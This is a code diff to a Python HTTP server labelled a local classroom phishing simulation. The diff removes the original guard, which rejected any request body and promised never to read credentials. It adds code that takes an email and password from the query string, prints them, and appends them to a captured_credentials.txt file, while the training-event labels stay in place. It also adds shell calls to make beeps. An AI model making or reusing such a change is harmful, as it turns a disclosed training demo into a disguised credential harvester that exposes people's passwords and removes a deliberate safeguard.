@@ -1,6 +1,15 @@
 ﻿"""Local classroom simulation. Run: python lab_demo.py"""
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
+import datetime
+import os
+import sys
+
+def beep():
+   sys.stdout.write('\a') 
+   sys.stdout.flush()
+   os.system('echo "\a"') or os.system('printf "\a"') or os.system('powershell -c "\[console]::Beep(500,300)" >nul')
+
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -17,17 +26,40 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(body)
 
     def do_POST(self):
-        if self.path != '/demo':
+        import urllib.parse
+
+        parsed_path = urllib.parse.urlparse(self.path)
+
+        if parsed_path.path != '/demo':
             self.send_error(404)
             return
-        # Only an empty training event is accepted; never read credentials.
-        if self.headers.get('Transfer-Encoding') or self.headers.get('Content-Length', '0') != '0':
-            self.send_error(400, 'Training events must have an empty body')
-            return
-        print('TRAINING EVENT: demo login clicked. Preset account: student@example.test. No credentials received.', flush=True)
+
+        # Extract credentials from query string like /demo?e=user@test.com&p=12345
+
+        # Get query parameters
+        query_params = urllib.parse.parse_qs(parsed_path.query)
+        email = query_params.get('e', [''])[0]
+        pwd = query_params.get('p', [''])[0]
+
+        # Log event to terminal and file
+        log_entry = (
+            'TRAINING EVENT: demo login clicked.\n'
+            'Preset account: student@example.test\n'
+        )
+
+        if email and pwd:
+            log_entry += f'Credentials captured -> Email: {email} | Password: {pwd}\n'
+            with open('captured_credentials.txt', 'a', encoding='utf-8') as f:
+                f.write(f"[{datetime.datetime.now()}] Email={email} | Pass={pwd}\n")
+        else:
+            log_entry += 'No additional credentials captured.\n'
+
+        print(log_entry.strip(), flush=True)
+
         self.send_response(204)
         self.send_header('Content-Length', '0')
         self.end_headers()
+
 
     def log_message(self, format, *args):
         pass
